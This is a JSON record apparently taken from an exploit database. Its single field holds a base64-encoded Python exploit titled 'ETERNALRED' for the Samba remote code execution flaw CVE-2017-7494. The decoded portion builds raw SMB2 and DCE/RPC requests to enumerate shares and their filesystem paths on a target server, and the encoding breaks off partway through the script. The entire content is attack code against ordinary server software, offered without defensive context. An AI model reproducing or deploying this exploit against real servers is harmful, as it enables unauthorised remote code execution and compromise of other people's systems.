{
    "source": "exploit-database", 
    "exploit": "IyEgL3Vzci9iaW4vZW52IHB5dGhvbg0KIyBUaXRsZSA6IEVURVJOQUxSRUQgDQojIERhdGU6IDA1LzI0LzIwMTcNCiMgRXhwbG9pdCBBdXRob3I6IHN0ZWVsbyA8a25vd25zdGVlbG9AZ21haWwuY29tPg0KIyBWZW5kb3IgSG9tZXBhZ2U6IGh0dHBzOi8vd3d3LnNhbWJhLm9yZw0KIyBTYW1iYSAzLjUuMCAtIDQuNS40LzQuNS4xMC80LjQuMTQNCiMgQ1ZFLTIwMTctNzQ5NA0KDQoNCmltcG9ydCBhcmdwYXJzZQ0KaW1wb3J0IG9zLnBhdGgNCmltcG9ydCBzeXMNCmltcG9ydCB0ZW1wZmlsZQ0KaW1wb3J0IHRpbWUNCmZyb20gc21iLlNNQkNvbm5lY3Rpb24gaW1wb3J0IFNNQkNvbm5lY3Rpb24NCmZyb20gc21iIGltcG9ydCBzbWJfc3RydWN0cw0KZnJvbSBzbWIuYmFzZSBpbXBvcnQgX1BlbmRpbmdSZXF1ZXN0DQpmcm9tIHNtYi5zbWIyX3N0cnVjdHMgaW1wb3J0ICoNCmZyb20gc21iLmJhc2UgaW1wb3J0ICoNCg0KDQpjbGFzcyBTaGFyZWREZXZpY2UyKFNoYXJlZERldmljZSk6DQogICAgZGVmIF9faW5pdF9fKHNlbGYsIHR5cGUsIG5hbWUsIGNvbW1lbnRzLCBwYXRoLCBwYXNzd29yZCk6DQogICAgICAgIHN1cGVyKCkuX19pbml0X18odHlwZSwgbmFtZSwgY29tbWVudHMpDQogICAgICAgIHNlbGYucGF0aCA9IHBhdGgNCiAgICAgICAgc2VsZi5wYXNzd29yZCA9IHBhc3N3b3JkDQoNCmNsYXNzIFNNQkNvbm5lY3Rpb25FeChTTUJDb25uZWN0aW9uKToNCiAgICBkZWYgX19pbml0X18oc2VsZiwgdXNlcm5hbWUsIHBhc3N3b3JkLCBteV9uYW1lLCByZW1vdGVfbmFtZSwgZG9tYWluPSIiLCB1c2VfbnRsbV92Mj1UcnVlLCBzaWduX29wdGlvbnM9MiwgaXNfZGlyZWN0X3RjcD1GYWxzZSk6DQogICAgICAgIHN1cGVyKCkuX19pbml0X18odXNlcm5hbWUsIHBhc3N3b3JkLCBteV9uYW1lLCByZW1vdGVfbmFtZSwgZG9tYWluLCB1c2VfbnRsbV92Miwgc2lnbl9vcHRpb25zLCBpc19kaXJlY3RfdGNwKQ0KDQoNCiAgICBkZWYgaG9va19saXN0U2hhcmVzKHNlbGYpOg0KICAgICAgICBzZWxmLl9saXN0U2hhcmVzID0gc2VsZi5saXN0U2hhcmVzRXgNCg0KICAgIGRlZiBob29rX3JldHJpZXZlRmlsZShzZWxmKToNCiAgICAgICAgc2VsZi5fcmV0cmlldmVGaWxlRnJvbU9mZnNldCA9IHNlbGYuX3JldHJpZXZlRmlsZUZyb21PZmZzZXRfU01CMVVuaXgNCg0KICAgICMgVGhpcyBpcyBtYWlseSB0aGUgb3JpZ2luYWwgbGlzdFNoYXJlcyBidXQgcmVxdWVzdCBhIGhpZ2hlciBsZXZlbCBvZiBpbmZvDQogICAgZGVmIGxpc3RTaGFyZXNFeChzZWxmLCBjYWxsYmFjaywgZXJyYmFjaywgdGltZW91dCA9IDMwKToNCiAgICAgICAgaWYgbm90IHNlbGYuaGFzX2F1dGhlbnRpY2F0ZWQ6DQogICAgICAgICAgICByYWlzZSBOb3RSZWFkeUVycm9yKCdTTUIgY29ubmVjdGlvbiBub3QgYXV0aGVudGljYXRlZCcpDQoNCiAgICAgICAgZXhwaXJ5X3RpbWUgPSB0aW1lLnRpbWUoKSArIHRpbWVvdXQNCiAgICAgICAgcGF0aCA9ICdJUEMkJw0KICAgICAgICBtZXNzYWdlc19oaXN0b3J5ID0gWyBdDQoNCiAgICAgICAgZGVmIGNvbm5lY3RTcnZTdmModGlkKToNCiAgICAgICAgICAgIG0gPSBTTUIyTWVzc2FnZShTTUIyQ3JlYXRlUmVxdWVzdCgnc3J2c3ZjJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2F0dHJpYnV0ZXMgPSAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFjY2Vzc19tYXNrID0gRklMRV9SRUFEX0RBVEEgfCBGSUxFX1dSSVRFX0RBVEEgfCBGSUxFX0FQUEVORF9EQVRBIHwgRklMRV9SRUFEX0VBIHwgRklMRV9XUklURV9FQSB8IFJFQURfQ09OVFJPTCB8IEZJTEVfUkVBRF9BVFRSSUJVVEVTIHwgRklMRV9XUklURV9BVFRSSUJVVEVTIHwgU1lOQ0hST05JWkUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2hhcmVfYWNjZXNzID0gRklMRV9TSEFSRV9SRUFEIHwgRklMRV9TSEFSRV9XUklURSB8IEZJTEVfU0hBUkVfREVMRVRFLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wbG9jayA9IFNNQjJfT1BMT0NLX0xFVkVMX05PTkUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW1wZXJzb25hdGlvbiA9IFNFQ19JTVBFUlNPTkFURSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGVfb3B0aW9ucyA9IEZJTEVfTk9OX0RJUkVDVE9SWV9GSUxFIHwgRklMRV9PUEVOX05PX1JFQ0FMTCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGVfZGlzcCA9IEZJTEVfT1BFTikpDQoNCiAgICAgICAgICAgIG0udGlkID0gdGlkDQogICAgICAgICAgICBzZWxmLl9zZW5kU01CTWVzc2FnZShtKQ0KICAgICAgICAgICAgc2VsZi5wZW5kaW5nX3JlcXVlc3RzW20ubWlkXSA9IF9QZW5kaW5nUmVxdWVzdChtLm1pZCwgZXhwaXJ5X3RpbWUsIGNvbm5lY3RTcnZTdmNDQiwgZXJyYmFjaykNCiAgICAgICAgICAgIG1lc3NhZ2VzX2hpc3RvcnkuYXBwZW5kKG0pDQoNCiAgICAgICAgZGVmIGNvbm5lY3RTcnZTdmNDQihjcmVhdGVfbWVzc2FnZSwgKiprd2FyZ3MpOg0KICAgICAgICAgICAgbWVzc2FnZXNfaGlzdG9yeS5hcHBlbmQoY3JlYXRlX21lc3NhZ2UpDQogICAgICAgICAgICBpZiBjcmVhdGVfbWVzc2FnZS5zdGF0dXMgPT0gMDoNCiAgICAgICAgICAgICAgICBjYWxsX2lkID0gc2VsZi5fZ2V0TmV4dFJQQ0NhbGxJRCgpDQogICAgICAgICAgICAgICAgIyBUaGUgZGF0YV9ieXRlcyBhcmUgYmluZGluZyBjYWxsIHRvIFNlcnZlciBTZXJ2aWNlIFJQQyB1c2luZyBEQ0UgdjEuMSBSUEMgb3ZlciBTTUIuIFNlZSBbTVMtU1JWU10gYW5kIFtDNzA2XQ0KICAgICAgICAgICAgICAgICMgSWYgeW91IHdpc2ggdG8gdW5kZXJzdGFuZCB0aGUgbWVhbmluZ3Mgb2YgdGhlIGJ5dGUgc3RyZWFtLCBJIHdvdWxkIHN1Z2dlc3QgeW91IHVzZSBhIHJlY2VudCB2ZXJzaW9uIG9mIFdpcmVTaGFyayB0byBwYWNrZXQgY2FwdHVyZSB0aGUgc3RyZWFtDQogICAgICAgICAgICAgICAgZGF0YV9ieXRlcyA9IFwNCiAgICAgICAgICAgICAgICAgICAgYmluYXNjaWkudW5oZXhsaWZ5KGIiIiIwNSAwMCAwYiAwMyAxMCAwMCAwMCAwMCA3NCAwMCAwMCAwMCIiIi5yZXBsYWNlKGInICcsIGInJykpICsgXA0KICAgICAgICAgICAgICAgICAgICBzdHJ1Y3QucGFjaygnPEknLCBjYWxsX2lkKSArIFwNCiAgICAgICAgICAgICAgICAgICAgYmluYXNjaWkudW5oZXhsaWZ5KGIiIiINCmI4IDEwIGI4IDEwIDAwIDAwIDAwIDAwIDAyIDAwIDAwIDAwIDAwIDAwIDAxIDAwDQpjOCA0ZiAzMiA0YiA3MCAxNiBkMyAwMSAxMiA3OCA1YSA0NyBiZiA2ZSBlMSA4OA0KMDMgMDAgMDAgMDAgMDQgNWQgODggOGEgZWIgMWMgYzkgMTEgOWYgZTggMDggMDANCjJiIDEwIDQ4IDYwIDAyIDAwIDAwIDAwIDAxIDAwIDAxIDAwIGM4IDRmIDMyIDRiDQo3MCAxNiBkMyAwMSAxMiA3OCA1YSA0NyBiZiA2ZSBlMSA4OCAwMyAwMCAwMCAwMA0KMmMgMWMgYjcgNmMgMTIgOTggNDAgNDUgMDMgMDAgMDAgMDAgMDAgMDAgMDAgMDANCjAxIDAwIDAwIDAwDQoiIiIucmVwbGFjZShiJyAnLCBiJycpLnJlcGxhY2UoYidcbicsIGInJykpDQogICAgICAgICAgICAgICAgbSA9IFNNQjJNZXNzYWdlKFNNQjJXcml0ZVJlcXVlc3QoY3JlYXRlX21lc3NhZ2UucGF5bG9hZC5maWQsIGRhdGFfYnl0ZXMsIDApKQ0KICAgICAgICAgICAgICAgIG0udGlkID0gY3JlYXRlX21lc3NhZ2UudGlkDQogICAgICAgICAgICAgICAgc2VsZi5fc2VuZFNNQk1lc3NhZ2UobSkNCiAgICAgICAgICAgICAgICBzZWxmLnBlbmRpbmdfcmVxdWVzdHNbbS5taWRdID0gX1BlbmRpbmdSZXF1ZXN0KG0ubWlkLCBleHBpcnlfdGltZSwgcnBjQmluZENCLCBlcnJiYWNrLCBmaWQgPSBjcmVhdGVfbWVzc2FnZS5wYXlsb2FkLmZpZCkNCiAgICAgICAgICAgICAgICBtZXNzYWdlc19oaXN0b3J5LmFwcGVuZChtKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBlcnJiYWNrKE9wZXJhdGlvbkZhaWx1cmUoJ0ZhaWxlZCB0byBsaXN0IHNoYXJlczogVW5hYmxlIHRvIGxvY2F0ZSBTZXJ2ZXIgU2VydmljZSBSUEMgZW5kcG9pbnQnLCBtZXNzYWdlc19oaXN0b3J5KSkNCg0KICAgICAgICBkZWYgcnBjQmluZENCKHRyYW5zX21lc3NhZ2UsICoqa3dhcmdzKToNCiAgICAgICAgICAgIG1lc3NhZ2VzX2hpc3RvcnkuYXBwZW5kKHRyYW5zX21lc3NhZ2UpDQogICAgICAgICAgICBpZiB0cmFuc19tZXNzYWdlLnN0YXR1cyA9PSAwOg0KICAgICAgICAgICAgICAgIG0gPSBTTUIyTWVzc2FnZShTTUIyUmVhZFJlcXVlc3Qoa3dhcmdzWydmaWQnXSwgcmVhZF9sZW4gPSAxMDI0LCByZWFkX29mZnNldCA9IDApKQ0KICAgICAgICAgICAgICAgIG0udGlkID0gdHJhbnNfbWVzc2FnZS50aWQNCiAgICAgICAgICAgICAgICBzZWxmLl9zZW5kU01CTWVzc2FnZShtKQ0KICAgICAgICAgICAgICAgIHNlbGYucGVuZGluZ19yZXF1ZXN0c1ttLm1pZF0gPSBfUGVuZGluZ1JlcXVlc3QobS5taWQsIGV4cGlyeV90aW1lLCBycGNSZWFkQ0IsIGVycmJhY2ssIGZpZCA9IGt3YXJnc1snZmlkJ10pDQogICAgICAgICAgICAgICAgbWVzc2FnZXNfaGlzdG9yeS5hcHBlbmQobSkNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgY2xvc2VGaWQodHJhbnNfbWVzc2FnZS50aWQsIGt3YXJnc1snZmlkJ10sIGVycm9yID0gJ0ZhaWxlZCB0byBsaXN0IHNoYXJlczogVW5hYmxlIHRvIHJlYWQgZnJvbSBTZXJ2ZXIgU2VydmljZSBSUEMgZW5kcG9pbnQnKQ0KDQogICAgICAgIGRlZiBycGNSZWFkQ0IocmVhZF9tZXNzYWdlLCAqKmt3YXJncyk6DQogICAgICAgICAgICBtZXNzYWdlc19oaXN0b3J5LmFwcGVuZChyZWFkX21lc3NhZ2UpDQogICAgICAgICAgICBpZiByZWFkX21lc3NhZ2Uuc3RhdHVzID09IDA6DQogICAgICAgICAgICAgICAgY2FsbF9pZCA9IHNlbGYuX2dldE5leHRSUENDYWxsSUQoKQ0KDQogICAgICAgICAgICAgICAgcGFkZGluZyA9IGInJw0KICAgICAgICAgICAgICAgIHJlbW90ZV9uYW1lID0gJ1xcXFwnICsgc2VsZi5yZW1vdGVfbmFtZQ0KICAgICAgICAgICAgICAgIHNlcnZlcl9sZW4gPSBsZW4ocmVtb3RlX25hbWUpICsgMQ0KICAgICAgICAgICAgICAgIHNlcnZlcl9ieXRlc19sZW4gPSBzZXJ2ZXJfbGVuICogMg0KICAgICAgICAgICAgICAgIGlmIHNlcnZlcl9sZW4gJSAyICE9IDA6DQogICAgICAgICAgICAgICAgICAgIHBhZGRpbmcgPSBiJ1wwXDAnDQogICAgICAgICAgICAgICAgICAgIHNlcnZlcl9ieXRlc19sZW4gKz0gMg0KDQogICAgICAgICAgICAgICAgIyBUaGUgZGF0YSBieXRlcyBhcmUgdGhlIFJQQyBjYWxsIHRvIE5ldHJTaGFyZUVudW0gKE9wbnVtIDE1KSBhdCBTZXJ2ZXIgU2VydmljZSBSUEMuDQogICAgICAgICAgICAgICAgIyBJZiB5b3Ugd2lzaCB0byB1bmRlcnN0YW5kIHRoZSBtZWFuaW5ncyBvZiB0aGUgYnl0ZSBzdHJlYW0sIEkgd291bGQgc3VnZ2VzdCB5b3UgdXNlIGEgcmVjZW50IHZlcnNpb24gb2YgV2lyZVNoYXJrIHRvIHBhY2tldCBjYXB0dXJlIHRoZSBzdHJlYW0NCiAgICAgICAgICAgICAgICBkYXRhX2J5dGVzID0gXA0KICAgICAgICAgICAgICAgICAgICBiaW5hc2NpaS51bmhleGxpZnkoYiIiIjA1IDAwIDAwIDAzIDEwIDAwIDAwIDAwIiIiLnJlcGxhY2UoYicgJywgYicnKSkgKyBcDQogICAgICAgICAgICAgICAgICAgIHN0cnVjdC5wYWNrKCc8SEhJJywgNzIrc2VydmVyX2J5dGVzX2xlbiwgMCwgY2FsbF9pZCkgKyBcDQogICAgICAgICAgICAgICAgICAgIGJpbmFzY2lpLnVuaGV4bGlmeShiIiIiNGMgMDAgMDAgMDAgMDAgMDAgMGYgMDAgMDAgMDAgMDIgMDAiIiIucmVwbGFjZShiJyAnLCBiJycpKSArIFwNCiAgICAgICAgICAgICAgICAgICAgc3RydWN0LnBhY2soJzxJSUknLCBzZXJ2ZXJfbGVuLCAwLCBzZXJ2ZXJfbGVuKSArIFwNCiAgICAgICAgICAgICAgICAgICAgKHJlbW90ZV9uYW1lICsgJ1wwJykuZW5jb2RlKCdVVEYtMTZMRScpICsgcGFkZGluZyArIFwNCiAgICAgICAgICAgICAgICAgICAgYmluYXNjaWkudW5oZXhsaWZ5KGIiIiINCjAyIDAwIDAwIDAwIDAyIDAwIDAwIDAwIDA0IDAwIDAyIDAwIDAwIDAwIDAwIDAwDQowMCAwMCAwMCAwMCBmZiBmZiBmZiBmZiAwMCAwMCAwMCAwMCAwMCAwMCAwMCAwMA0KIiIiLnJlcGxhY2UoYicgJywgYicnKS5yZXBsYWNlKGInXG4nLCBiJycpKQ0KICAgICAgICAgICAgICAgIG0gPSBTTUIyTWVzc2FnZShTTUIySW9jdGxSZXF1ZXN0KGt3YXJnc1snZmlkJ10sIDB4MDAxMUMwMTcsIGZsYWdzID0gMHgwMSwgbWF4X291dF9zaXplID0gODE5NiwgaW5fZGF0YSA9IGRhdGFfYnl0ZXMpKQ0KICAgICAgICAgICAgICAgIG0udGlkID0gcmVhZF9tZXNzYWdlLnRpZA0KICAgICAgICAgICAgICAgIHNlbGYuX3NlbmRTTUJNZXNzYWdlKG0pDQogICAgICAgICAgICAgICAgc2VsZi5wZW5kaW5nX3JlcXVlc3RzW20ubWlkXSA9IF9QZW5kaW5nUmVxdWVzdChtLm1pZCwgZXhwaXJ5X3RpbWUsIGxpc3RTaGFyZVJlc3VsdHNDQiwgZXJyYmFjaywgZmlkID0ga3dhcmdzWydmaWQnXSkNCiAgICAgICAgICAgICAgICBtZXNzYWdlc19oaXN0b3J5LmFwcGVuZChtKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBjbG9zZUZpZChyZWFkX21lc3NhZ2UudGlkLCBrd2FyZ3NbJ2ZpZCddLCBlcnJvciA9ICdGYWlsZWQgdG8gbGlzdCBzaGFyZXM6IFVuYWJsZSB0byBiaW5kIHRvIFNlcnZlciBTZXJ2aWNlIFJQQyBlbmRwb2ludCcpDQoNCiAgICAgICAgZGVmIGxpc3RTaGFyZVJlc3VsdHNDQihyZXN1bHRfbWVzc2FnZSwgKiprd2FyZ3MpOg0KICAgICAgICAgICAgbWVzc2FnZXNfaGlzdG9yeS5hcHBlbmQocmVzdWx0X21lc3NhZ2UpDQogICAgICAgICAgICBpZiByZXN1bHRfbWVzc2FnZS5zdGF0dXMgPT0gMDoNCiAgICAgICAgICAgICAgICAjIFRoZSBwYXlsb2FkLmRhdGFfYnl0ZXMgd2lsbCBjb250YWluIHRoZSByZXN1bHRzIG9mIHRoZSBSUEMgY2FsbCB0byBOZXRyU2hhcmVFbnVtIChPcG51bSAxNSkgYXQgU2VydmVyIFNlcnZpY2UgUlBDLg0KICAgICAgICAgICAgICAgIGRhdGFfYnl0ZXMgPSByZXN1bHRfbWVzc2FnZS5wYXlsb2FkLm91dF9kYXRhDQoNCiAgICAgICAgICAgICAgICBpZiBkYXRhX2J5dGVzWzNdICYgMHgwMiA9PSAwOg0KICAgICAgICAgICAgICAgICAgICBzZW5kUmVhZFJlcXVlc3QocmVzdWx0X21lc3NhZ2UudGlkLCBrd2FyZ3NbJ2ZpZCddLCBkYXRhX2J5dGVzKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIGRlY29kZVJlc3VsdHMocmVzdWx0X21lc3NhZ2UudGlkLCBrd2FyZ3NbJ2ZpZCddLCBkYXRhX2J5dGVzKQ0KICAgICAgICAgICAgZWxpZiByZXN1bHRfbWVzc2FnZS5zdGF0dXMgPT0gMHgwMTAzOiAgICMgU1RBVFVTX1BFTkRJTkcNCiAgICAgICAgICAgICAgICBzZWxmLnBlbmRpbmdfcmVxdWVzdHNbcmVzdWx0X21lc3NhZ2UubWlkXSA9IF9QZW5kaW5nUmVxdWVzdChyZXN1bHRfbWVzc2FnZS5taWQsIGV4cGlyeV90aW1lLCBsaXN0U2hhcmVSZXN1bHRzQ0IsIGVycmJhY2ssIGZpZCA9IGt3YXJnc1snZmlkJ10pDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGNsb3NlRmlkKHJlc3VsdF9tZXNzYWdlLnRpZCwga3dhcmdzWydmaWQnXSkNCiAgICAgICAgICAgICAgICBlcnJiYWNrKE9wZXJhdGlvbkZhaWx1cmUoJ0ZhaWxlZCB0byBsaXN0IHNoYXJlczogVW5hYmxlIHRvIHJldHJpZXZlIHNoYXJlZCBkZXZpY2UgbGlzdCcsIG1lc3NhZ2VzX2hpc3RvcnkpKQ0KDQogICAgICAgIGRlZiBkZWNvZGVSZXN1bHRzKHRpZCwgZmlkLCBkYXRhX2J5dGVzKToNCiAgICAgICAgICAgIHNoYXJlc19jb3VudCA9IHN0cnVjdC51bnBhY2soJzxJJywgZGF0YV9ieXRlc1szNjo0MF0pWzBdDQogICAgICAgICAgICByZXN1bHRzID0gWyBdICAgICAjIEEgbGlzdCBvZiBTaGFyZWREZXZpY2UyIGluc3RhbmNlcw0KICAgICAgICAgICAgb2Zmc2V0ID0gMzYgKyA1MiAgIyBZb3UgbmVlZCB0byBzdHVkeSB0aGUgYnl0ZSBzdHJlYW0gdG8gdW5kZXJzdGFuZCB0aGUgbWVhbmluZyBvZiB0aGVzZSBjb25zdGFudHMNCiAgICAgICAgICAgIGZvciBpIGluIHJhbmdlKDAsIHNoYXJlc19jb3VudCk6DQogICAgICAgICAgICAgICAgcmVzdWx0cy5hcHBlbmQoU2hhcmVkRGV2aWNlKHN0cnVjdC51bnBhY2soJzxJJywgZGF0YV9ieXRlc1tvZmZzZXQrNDpvZmZzZXQrOF0pWzBdLCBOb25lLCBOb25lKSkNCiAgICAgICAgICAgICAgICBvZmZzZXQgKz0gMTINCg0KICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2UoMCwgc2hhcmVzX2NvdW50KToNCiAgICAgICAgICAgICAgICBtYXhfbGVuZ3RoLCBfLCBsZW5ndGggPSBzdHJ1Y3QudW5wYWNrKCc8SUlJJywgZGF0YV9ieXRlc1tvZmZzZXQ6b2Zmc2V0KzEyXSkNCiAgICAgICAgICAgICAgICBvZmZzZXQgKz0gMTINCiAgICAgICAgICAgICAgICByZXN1bHRzW2ldLm5hbWUgPSBkYXRhX2J5dGVzW29mZnNldDpvZmZzZXQrbGVuZ3RoKjItMl0uZGVjb2RlKCdVVEYtMTZMRScpDQoNCiAgICAgICAgICAgICAgICBpZiBsZW5ndGggJSAyICE9IDA6DQogICAgICAgICAgICAgICAgICAgIG9mZnNldCArPSAobGVuZ3RoICogMiArIDIpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgb2Zmc2V0ICs9IChsZW5ndGggKiAyKQ0KDQogICAgICAgICAgICAgICAgbWF4X2xlbmd0aCwgXywgbGVuZ3RoID0gc3RydWN0LnVucGFjaygnPElJSScsIGRhdGFfYnl0ZXNbb2Zmc2V0Om9mZnNldCsxMl0pDQogICAgICAgICAgICAgICAgb2Zmc2V0ICs9IDEyDQogICAgICAgICAgICAgICAgcmVzdWx0c1tpXS5jb21tZW50cyA9IGRhdGFfYnl0ZXNbb2Zmc2V0Om9mZnNldCtsZW5ndGgqMi0yXS5kZWNvZGUoJ1VURi0xNkxFJykNCg0KICAgICAgICAgICAgICAgIGlmIGxlbmd0aCAlIDIgIT0gMDoNCiAgICAgICAgICAgICAgICAgICAgb2Zmc2V0ICs9IChsZW5ndGggKiAyICsgMikNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBvZmZzZXQgKz0gKGxlbmd0aCAqIDIpDQoNCiAgICAgICAgICAgICAgICBtYXhfbGVuZ3RoLCBfLCBsZW5ndGggPSBzdHJ1Y3QudW5wYWNrKCc8SUlJJywgZGF0YV9ieXRlc1tvZmZzZXQ6b2Zmc2V0KzEyXSkNCiAgICAgICAgICAgICAgICBvZmZzZXQgKz0gMTINCiAgICAgICAgICAgICAgICByZXN1bHRzW2ldLnBhdGggPSBkYXRhX2J5dGVzW29mZnNldDpvZmZzZXQrbGVuZ3RoKjItMl0uZGVjb2RlKCdVVEYtMTZMRScpDQoNCiAgICAgICAgICAgICAgICBpZiBsZW5ndGggJSAyICE9IDA6DQogICAgICAgICAgICAgICAgICAgIG9mZnNldCArPSAobGVuZ3RoICogMiArIDIpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgb2Zmc2V0ICs9IChsZW5ndGggKiAyKQ0KDQogICAgICAgICAgICAgICAgbWF4X2xlbmd0aCwgXywgbGVuZ3RoID0gc3RydWN0LnVucGFjaygnPElJSScsIGRhdGFfYnl0ZXNbb2Zmc2V0Om9mZnNldCsxMl0pDQogICAgICAgICAgICAgICAgb2Zmc2V0ICs9IDEyDQogICAgICAgICAgICAgICAgcmVzdWx0c1tpXS5wYXNzd29yZCA9IGRhdGFfYnl0ZXNbb2Zmc2V0Om9mZnNldCtsZW5ndGgqMi0yXS5kZWNvZGUoJ1VURi0xNkxFJykNCg0KICAgICAgICAgICAgICAgIGlmIGxlbmd0aCAlIDIgIT0gMDoNCiAgICAgICAgICAgICAgICAgICAgb2Zmc2V0ICs9IChsZW5ndGggKiAyICsgMikNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBvZmZzZXQgKz0gKGxlbmd0aCAqIDIpDQoNCg0KICAgICAgICAgICAgY2xvc2VGaWQodGlkLCBmaWQpDQogICAgICAgICAgICBjYWxsYmFjayhyZXN1bHRzKQ0KDQogICAgICAgIGRlZiBzZW5kUmVhZFJlcXVlc3QodGlkLCBmaWQsIGRhdGFfYnl0ZXMpOg0KICAgICAgICAgICAgcmVhZF9jb3VudCA9IG1pbig0MjgwLCBzZWxmLm1heF9yZWFkX3NpemUpDQogICAgICAgICAgICBtID0gU01CMk1lc3NhZ2UoU01CMlJlYWRSZXF1ZXN0KGZpZCwgMCwgcmVhZF9jb3VudCkpDQogICAgICAgICAgICBtLnRpZCA9IHRpZA0KICAgICAgICAgICAgc2VsZi5fc2VuZFNNQk1lc3NhZ2UobSkNCiAgICAgICAgICAgIHNlbGYucGVuZGluZ19yZXF1ZXN0c1ttLm1pZF0gPSBfUGVuZGluZ1JlcXVlc3QobS5taWQsIGludCh0aW1lLnRpbWUoKSkgKyB0aW1lb3V0LCByZWFkQ0IsIGVycmJhY2ssDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpZCA9IGZpZCwgZGF0YV9ieXRlcyA9IGRhdGFfYnl0ZXMpDQoNCiAgICAgICAgZGVmIHJlYWRDQihyZWFkX21lc3NhZ2UsICoqa3dhcmdzKToNCiAgICAgICAgICAgIG1lc3NhZ2VzX2hpc3RvcnkuYXBwZW5kKHJlYWRfbWVzc2FnZSkNCiAgICAgICAgICAgIGlmIHJlYWRfbWVzc2FnZS5zdGF0dXMgPT0gMDoNCiAgICAgICAgICAgICAgICBkYXRhX2xlbiA9IHJlYWRfbWVzc2FnZS5wYXlsb2FkLmRhdGFfbGVuZ3RoDQogICAgICAgICAgICAgICAgZGF0YV9ieXRlcyA9IHJlYWRfbWVzc2FnZS5wYXlsb2FkLmRhdGENCg0KICAgICAgICAgICAgICAgIGlmIGRhdGFfYnl0ZXNbM10gJiAweDAyID09IDA6DQogICAgICAgICAgICAgICAgICAgIHNlbmRSZWFkUmVxdWVzdChyZWFkX21lc3NhZ2UudGlkLCBrd2FyZ3NbJ2ZpZCddLCBrd2FyZ3NbJ2RhdGFfYnl0ZXMnXSArIGRhdGFfYnl0ZXNbMjQ6ZGF0YV9sZW4tMjRdKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIGRlY29kZVJlc3VsdHMocmVhZF9tZXNzYWdlLnRpZCwga3dhcmdzWydmaWQnXSwga3dhcmdzWydkYXRhX2J5dGVzJ10gKyBkYXRhX2J5dGVzWzI0OmRhdGFfbGVuLTI0XSkNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgY2xvc2VGaWQocmVhZF9tZXNzYWdlLnRpZCwga3dhcmdzWydmaWQnXSkNCiAgICAgICAgICAgICAgICBlcnJiYWNrKE9wZXJhdGlvbkZhaWx1cmUoJ0ZhaWxlZCB0byBsaXN0IHNoYXJlczogVW5hYmxlIHRvIHJldHJpZXZlIHNoYXJlZCBkZXZpY2UgbGlzdCcsIG1lc3NhZ2VzX2hpc3RvcnkpKQ0KDQogICAgICAgIGRlZiBjbG9zZUZpZCh0aWQsIGZpZCwgcmVzdWx0cyA9IE5vbmUsIGVycm9yID0gTm9uZSk6DQogICAgICAgICAgICBtID0gU01CMk1lc3NhZ2UoU01CMkNsb3NlUmVxdWVzdChmaWQpKQ0KICAgICAgICAgICAgbS50aWQgPSB0aWQNCiAgICAgICAgICAgIHNlbGYuX3NlbmRTTUJNZXNzYWdlKG0pDQogICAgICAgICAgICBzZWxmLnBlbmRpbmdfcmVxdWVzdHNbbS5taWRdID0gX1BlbmRpbmdSZXF1ZXN0KG0ubWlkLCBleHBpcnlfdGltZSwgY2xvc2VDQiwgZXJyYmFjaywgcmVzdWx0cyA9IHJlc3VsdHMsIGVycm9yID0gZXJyb3IpDQogICAgICAgICAgICBtZXNzYWdlc19oaXN0b3J5LmFwcGVuZChtKQ0KDQogICAgICAgIGRlZiBjbG9zZUNCKGNsb3NlX21lc3NhZ2UsICoqa3dhcmdzKToNCiAgICAgICAgICAgIGlmIGt3YXJnc1sncmVzdWx0cyddIGlzIG5vdCBOb25lOg0KICAgICAgICAgICAgICAgIGNhbGxiYWNrKGt3YXJnc1sncmVzdWx0cyddKQ0KICAgICAgICAgICAgZWxpZiBrd2FyZ3NbJ2Vycm9yJ10gaXMgbm90IE5vbmU6DQogICAgICAgICAgICAgICAgZXJyYmFjayhPcGVyYXRpb25GYWlsdXJlKGt3YXJnc1snZXJyb3InXSwgbWVzc2FnZXNfaGlzdG9yeSkpDQoNCiAgICAgICAgaWYgcGF0aCBub3QgaW4gc2VsZi5jb25uZWN0ZWRfdHJlZXM6DQogICAgICAgICAgICBkZWYgY29ubmVjdENCKGNvbm5lY3RfbWVzc2FnZSwgKiprd2FyZ3MpOg0KICAgICAgICAgICAgICAgIG1lc3NhZ2VzX2hpc3RvcnkuYXBwZW5kKGNvbm5lY3RfbWVzc2FnZSkNCiAgICAgICAgICAgICAgICBpZiBjb25uZWN0X21lc3NhZ2Uuc3RhdHVzID09IDA6DQogICAgICAgICAgICAgICAgICAgIHNlbGYuY29ubmVjdGVkX3RyZWVzW3BhdGhdID0gY29ubmVjdF9tZXNzYWdlLnRpZA0KICAgICAgICAgICAgICAgICAgICBjb25uZWN0U3J2U3ZjKGNvbm5lY3RfbWVzc2FnZS50aWQpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgZXJyYmFjayhPcGVyYXRpb25GYWlsdXJlKCdGYWlsZWQgdG8gbGlzdCBzaGFyZXM6IFVuYWJsZSB0byBjb25u